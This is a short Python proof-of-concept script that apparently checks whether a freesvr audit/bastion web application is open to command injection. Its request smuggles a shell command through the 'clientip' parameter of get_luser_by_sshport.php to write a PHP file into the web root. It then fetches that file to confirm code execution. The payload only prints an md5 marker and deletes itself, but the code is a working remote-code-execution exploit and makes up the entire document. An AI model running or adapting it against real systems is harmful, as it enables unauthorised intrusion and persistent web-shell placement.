import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r2=randomLowercase(10)
def doCheck(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+'get_luser_by_sshport.php?clientip=1;echo%20"<?php%20echo%20md5('+r2+');unlink(__FILE__);?>">/opt/freesvr/web/htdocs/freesvr/audit/'+r2+'.php;&clientport=1'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r0=True
	else:
		r0=False
	url=baseurl+""+r2+".php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(r2).encode()).hexdigest() in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
